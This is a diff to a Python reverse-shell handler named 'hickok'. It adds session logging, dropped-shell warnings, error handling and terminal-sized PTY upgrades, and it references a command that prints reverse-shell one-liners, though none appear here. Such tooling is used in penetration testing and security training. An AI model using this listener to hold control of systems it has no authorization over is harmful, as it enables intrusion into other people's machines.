@@ -7,18 +7,23 @@ import os
 import sys
 import time
 
-from hickok import payloads
+from hickok import payloads, sqlcache
 from hickok.session import SessionManager
 
 _SPINNER = "⣾⣽⣻⢿⡿⣟⣯⣷"   # a little block that turns while we wait for a shell
 
+
+def _sessions_dir():
+    """Where session transcripts are written (under hickok's data dir)."""
+    return sqlcache.data_home() / "sessions"
+
 HELP = """commands:
   sessions                 list connected sessions
-  interact <id>            attach to a session (detach with Ctrl-])
+  interact [id]            attach to a session (detach with Ctrl-]) — id optional if only one
   cmd <id> <command>       run a single command and print the output
-  upgrade <id>             upgrade the shell to a full PTY (python pty.spawn)
+  upgrade [id]             upgrade to a full PTY, sized to your terminal
   payloads [lhost] [lport] print reverse-shell one-liners
-  kill <id>                drop a session
+  kill [id]                drop a session
   help                     show this help
   exit                     quit
 """
@@ -34,14 +39,33 @@ class ShellServer:
         self._revealed = False
 
     async def _on_conn(self, reader, writer) -> None:
-        sess = self.mgr.add(reader, writer)
+        peer = writer.get_extra_info("peername") or ("?", 0)
+        host, port = peer[0], peer[1]
+        log_path = self._log_path_for(host, port)
+        sess = self.mgr.add(reader, writer, on_close=self._on_session_close, log_path=log_path)
         sess.start()
-        host, port = sess.peer[0], sess.peer[1]
         self.console.good(f"session {sess.id} opened — {host}:{port}")
+        if log_path:
+            self.console.info(f"logging session {sess.id} → {log_path}")
         # showdown mode: the first shell to land is the payoff — play it out.
         if self.console.showdown and not self._revealed:
             self._revealed = True
             self.console.showdown.shell()
+
+    def _on_session_close(self, sess) -> None:
+        """A shell dropped on its own (not a deliberate kill) — say so, so a lost
+        foothold doesn't pass unnoticed."""
+        self.console.warn(f"session {sess.id} died — {sess.peer[0]}:{sess.peer[1]}")
+
+    def _log_path_for(self, host, port) -> str | None:
+        """A per-session transcript path under the data dir (best-effort)."""
+        try:
+            d = _sessions_dir()
+            d.mkdir(parents=True, exist_ok=True)
+            ts = time.strftime("%Y%m%d-%H%M%S")
+            return str(d / f"{ts}_{str(host).replace(':', '_')}_{port}.log")
+        except OSError:
+            return None
 
     async def _start_listeners(self) -> None:
         for port in self.ports:
@@ -113,22 +137,27 @@ class ShellServer:
 
             if cmd in ("exit", "quit"):
                 break
-            elif cmd in ("help", "?"):
-                self.console.plain(HELP)
-            elif cmd in ("sessions", "ls"):
-                self._list_sessions()
-            elif cmd == "payloads":
-                self._show_payloads(arg)
-            elif cmd in ("cmd", "run"):
-                await self._run_cmd(arg)
-            elif cmd == "upgrade":
-                await self._upgrade(arg)
-            elif cmd == "interact":
-                await self._interact(arg)
-            elif cmd == "kill":
-                self._kill(arg)
-            else:
-                self.console.warn(f"unknown command: {cmd} (type 'help')")
+            # A failing command (e.g. writing to a shell that just dropped) must
+            # not take the whole listener down — report it and keep the console.
+            try:
+                if cmd in ("help", "?"):
+                    self.console.plain(HELP)
+                elif cmd in ("sessions", "ls"):
+                    self._list_sessions()
+                elif cmd == "payloads":
+                    self._show_payloads(arg)
+                elif cmd in ("cmd", "run"):
+                    await self._run_cmd(arg)
+                elif cmd == "upgrade":
+                    await self._upgrade(arg)
+                elif cmd == "interact":
+                    await self._interact(arg)
+                elif cmd == "kill":
+                    self._kill(arg)
+                else:
+                    self.console.warn(f"unknown command: {cmd} (type 'help')")
+            except Exception as exc:
+                self.console.bad(f"{cmd}: {exc}")
 
     def _list_sessions(self) -> None:
         sessions = self.mgr.all()
@@ -149,11 +178,23 @@ class ShellServer:
         self.console.plain("")
 
     def _resolve(self, arg: str):
+        bits = arg.split()
+        if not bits:                               # no id given — use the sole session
+            alive = [s for s in self.mgr.all() if s.alive]
+            if len(alive) == 1:
+                return alive[0]
+            if not self.mgr.all():
+                self.console.warn("no sessions yet")
+            else:
+                self.console.warn("which session? add a numeric id (see 'sessions')")
+            return None
+        tok = bits[0]
         try:
-            sess = self.mgr.get(int(arg.split()[0]))
-        except (ValueError, IndexError):
+            sid = int(tok)
+        except ValueError:
             self.console.warn("usage needs a numeric session id")
             return None
+        sess = self.mgr.get(sid)
         if not sess:
             self.console.warn("no such session")
             return None
@@ -178,7 +219,14 @@ class ShellServer:
         if not sess:
             return
         await sess.send(payloads.TTY_UPGRADE.encode() + b"\n")
-        self.console.good("sent PTY upgrade — interact and run: export TERM=xterm")
+        try:
+            size = os.get_terminal_size()
+            rows, cols = size.lines, size.columns
+        except OSError:
+            rows, cols = 24, 80
+        await asyncio.sleep(0.4)                  # let the PTY come up before sizing it
+        await sess.send(payloads.pty_setup(rows, cols).encode() + b"\n")
+        self.console.good(f"PTY spawned and sized {rows}x{cols} — now: interact {sess.id}")
 
     def _kill(self, arg: str) -> None:
         sess = self._resolve(arg)
